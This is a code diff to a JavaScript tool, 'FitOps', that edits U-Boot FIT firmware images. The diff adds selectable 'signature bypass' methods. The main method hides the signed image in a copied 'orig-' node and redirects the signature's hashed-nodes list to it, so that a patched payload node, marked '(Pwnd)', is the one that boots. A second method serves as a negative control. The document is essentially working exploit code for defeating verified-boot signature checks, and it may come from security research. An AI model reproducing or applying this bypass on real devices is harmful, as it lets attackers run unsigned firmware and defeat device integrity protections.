@@ -367,15 +367,60 @@ const FitOps = (() => {
   }
 
   /**
+   * Bypass methods, in the order the drop-down offers them.  opts.method
+   * selects one; the first entry is the default.
+   *
+   *   hashed-nodes  Move the signed image into an orig- container, redirect
+   *                 the signature's hashed-nodes list at the copy and leave
+   *                 the patched node in its place, where lookups find it.
+   *   sanity-check  Patch the signed image where it stands and touch nothing
+   *                 else.  The signature keeps covering data that no longer
+   *                 matches it, so verification must fail: this is the
+   *                 negative control, not a bypass.
+   */
+  const METHODS = ['hashed-nodes', 'sanity-check'];
+
+  function methodOf(opts) {
+    const method = (opts && opts.method) || METHODS[0];
+    if (!METHODS.includes(method)) throw new Error(`Unknown bypass method '${method}'`);
+    return method;
+  }
+
+  /**
+   * Move the payload into an image node: new data, no compression, a (Pwnd)
+   * marker in the description and, unless the caller opted out, fresh hashes.
+   */
+  async function patchImageNode(node, newData, opts) {
+    FDT.setProperty(node, 'data', newData instanceof Uint8Array ? newData : new Uint8Array(newData));
+
+    // Set compression to none
+    FDT.setProperty(node, 'compression', 'none');
+
+    // Append (Pwnd) to description
+    const desc = FDT.getStringProperty(node, 'description');
+    if (desc !== null && !desc.includes('(Pwnd)')) {
+      FDT.setProperty(node, 'description', desc + ' (Pwnd)');
+    }
+
+    // Recalculate hashes for the modified node
+    if (!opts || opts.recomputeHashes !== false) {
+      await recalcHashesForNode(node, FDT.getProperty(node, 'data'));
+    }
+  }
+
+  /**
    * Signature bypass: clone original node, replace data, redirect signatures.
    *
    * Each bypassed image gets its own container node placed immediately after
    * the target in /images.  This preserves the binary ordering of cloned
    * nodes, which is critical because fdt_find_regions walks the FDT linearly
    * and the concatenated hash input must match the original region order.
+   *
+   * The sanity-check method skips all of that and patches the signed node
+   * itself, leaving the signature to fail over data it no longer matches.
    */
   async function bypassSignature(tree, targetNodeName, newData, opts) {
-    const recomputeHashes = !opts || opts.recomputeHashes !== false;
+    const method = methodOf(opts);
     const redirectSignatures = !opts || opts.redirectSignatures !== false;
     const imagesNode = FDT.findNode(tree.root, ['images']);
     if (!imagesNode) throw new Error('No /images node');
@@ -383,6 +428,11 @@ const FitOps = (() => {
     // Find target node
     const targetNode = imagesNode.children.find(c => c.name === targetNodeName);
     if (!targetNode) throw new Error(`Image node '${targetNodeName}' not found`);
+
+    if (method === 'sanity-check') {
+      await patchImageNode(targetNode, newData, opts);
+      return;
+    }
 
     // Deep clone the original
     const original = FDT.cloneNode(targetNode);
@@ -404,23 +454,9 @@ const FitOps = (() => {
       }
     }
 
-    // Replace data on original node
-    FDT.setProperty(targetNode, 'data', newData instanceof Uint8Array ? newData : new Uint8Array(newData));
-
-    // Set compression to none
-    FDT.setProperty(targetNode, 'compression', 'none');
-
-    // Append (Pwnd) to description
-    const desc = FDT.getStringProperty(targetNode, 'description');
-    if (desc !== null) {
-      FDT.setProperty(targetNode, 'description', desc + ' (Pwnd)');
-    }
-
-    // Recalculate hashes for the modified node
-    if (recomputeHashes) {
-      const data = FDT.getProperty(targetNode, 'data');
-      await recalcHashesForNode(targetNode, data);
-    }
+    // Replace data, compression, description and hashes on the node that
+    // stays behind under the signed name -- the one that gets booted
+    await patchImageNode(targetNode, newData, opts);
 
     // Redirect signature references
     if (redirectSignatures) {
@@ -518,6 +554,7 @@ const FitOps = (() => {
     root,
     crc32,
     sha256,
+    METHODS,
     findFdtImage,
     findKernelImage,
     findRamdiskImage,
